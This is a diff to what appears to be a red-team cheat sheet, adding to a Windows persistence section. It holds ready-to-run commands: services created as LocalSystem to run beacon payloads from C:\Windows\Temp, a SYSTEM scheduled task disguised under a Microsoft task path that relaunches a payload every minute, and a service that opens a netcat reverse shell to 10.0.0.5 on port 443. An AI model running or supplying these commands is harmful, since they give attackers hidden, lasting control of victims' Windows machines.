@@ -321,7 +321,16 @@ Bypass UAC
   https://github.com/hfiref0x/UACME
     
 Persistance
+  StayKit
+    Service:
+      Name=MyService
+      Command=C:\Windows\Temp\myservice.exe
+      Drop Location=Command=C:\Windows\Temp\myservice.exe
+      Listener: https
+      Custom File: /root/beacons/beacon-svc.exe
+
   shell sc create MyService binpath= c:\windows\temp\https-local-svc-x64.exe start= auto
+  
   schtasks /create /f /sc minute /mo 1 /tn "Microsoft\Windows\WwanSvc\WUpdater" /ru "SYSTEM" /tr "cmd.exe /C tasklist | findstr.exe gpupdater.exe || start c:\windows\system32\gpupdater.exe"
     Runs every 1 minute to see if gpupdater.exe process is not running and restart it if not
   sc create evilsvc binpath= "c:\tools\nc 10.0.0.5 443 -e cmd.exe" start= "auto" obj= "LocalSystem" password= ""
